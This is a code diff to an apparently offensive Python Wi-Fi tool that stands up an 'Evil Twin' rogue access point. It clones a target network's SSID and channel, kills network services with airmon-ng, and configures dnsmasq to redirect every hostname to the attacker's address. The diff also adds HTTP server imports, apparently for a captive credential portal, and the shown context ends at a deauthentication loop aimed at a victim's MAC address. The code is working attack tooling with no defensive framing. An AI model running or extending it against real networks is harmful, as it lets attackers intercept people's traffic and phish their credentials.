@@ -2,70 +2,72 @@ import subprocess, time
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq
 from threading import Thread, Event
 import os
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
 
 # Event to stop deauth thread
 _deauth_stop = Event()
 
 
-def create_evil_ap(ap_info, iface):
-    """
-    Launch hostapd and dnsmasq to create an open Evil Twin AP,
-    binding dnsmasq only to the AP interface to avoid port conflicts.
-    """
-    print("Creating Evil Twin AP...")
-    ssid    = ap_info['SSID']
-    channel = ap_info['Channel']
-
-    # 1) Write hostapd config
-    config_path = '/tmp/evil_hostapd.conf'
-    hostapd_conf = f"""
-interface={iface}
+def write_hostapd_conf(ap_iface, ssid, channel, path="hostapd.conf"):
+    content = f"""\
+interface={ap_iface}
+driver=nl80211
 ssid={ssid}
 channel={channel}
 hw_mode=g
 auth_algs=1
 ignore_broadcast_ssid=0
 """
-    with open(config_path, 'w') as f:
-        f.write(hostapd_conf)
+    with open(path, 'w') as f:
+        f.write(content)
 
-    # 2) Clean up any previous IP configuration on the interface and set a static IP
-    subprocess.run(['ip','addr','del','10.0.0.1/24','dev',iface], check=False)
-    subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface], check=False)
 
-    # 3) Stop any existing dnsmasq instances to avoid conflicts
-    subprocess.run(['pkill', '-f', 'dnsmasq'], check=False)
+def write_dnsmasq_conf(ap_iface, path="dnsmasq.conf"):
+    content = f"""\
+interface={ap_iface}
+dhcp-range=10.0.0.10,10.0.0.100,12h
+dhcp-option=3,10.0.0.1 
+dhcp-option=6,10.0.0.1 
+address=/#/10.0.0.1 
+no-resolv
+server=8.8.8.8
+bind-interfaces
+"""
+    with open(path, 'w') as f:
+        f.write(content)
 
-    # 4) Start dnsmasq, binding to that single IP/interface
-    subprocess.Popen([
-        'dnsmasq',
-        # Only serve on our AP interface:
-        f'--interface={iface}',
-        '--bind-interfaces',
-        # Use our AP IP for DNS answers:
-        '--listen-address=10.0.0.1',
-        # DHCP range:
-        '--dhcp-range=10.0.0.10,10.0.0.100,12h',
-        # Don’t read /etc/resolv.conf, but forward queries to Google:
-        '--no-resolv',
-        '--server=8.8.8.8',
-        # Redirect all hostnames to our portal:
-        '--address=/#/10.0.0.1',
-    ])#, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    print("dnsmasq started, serving DHCP and DNS")
+def create_evil_ap(ap_info, ap_iface):
+    ssid    = ap_info['SSID']
+    channel = ap_info['Channel']
 
-    # 2) Start hostapd in background
-    # subprocess.Popen(
-    #     ['hostapd', config_path],
-    #     stdout=subprocess.DEVNULL,
-    #     stderr=subprocess.DEVNULL
-    # )
-    subprocess.Popen(
-        ['hostapd', config_path]
-    )
+    print("1) Stopping NetworkManager/other services…")
+    subprocess.run(['airmon-ng', 'check', 'kill'], check=False)
 
-    print(f"Evil AP '{ssid}' launched (open) on {iface} at 10.0.0.1")
+    # ensure ap_iface exists (via init.sh) and is up
+    subprocess.run(['ip', 'link', 'set', ap_iface, 'up'], check=True)
+
+    # assign IP to ap_iface (so dnsmasq will bind)
+    subprocess.run(['ip','addr','flush','dev',ap_iface], check=False)
+    subprocess.run(['ip','addr','add','10.0.0.1/24','dev',ap_iface], check=True)
+
+    # 3) Write configs
+    write_hostapd_conf(ap_iface, ssid, channel, path="hostapd.conf")
+    write_dnsmasq_conf(ap_iface, path="dnsmasq.conf")
+
+    # 4) Launch dnsmasq with that conf
+    print("4) Launching dnsmasq…")
+    subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])
+
+    time.sleep(0.5)  # let DNS/DHCP settle
+
+    # 5) Launch hostapd with that conf
+    print("5) Launching hostapd…")
+    HOSTAPD = '/usr/bin/hostapd'
+    subprocess.Popen([HOSTAPD, 'hostapd.conf'])
+
+    print(f"Evil Twin '{ssid}' should now be broadcasting on {ap_iface}.")
 
 
 def _deauth_loop(real_bssid, victim_mac, iface):
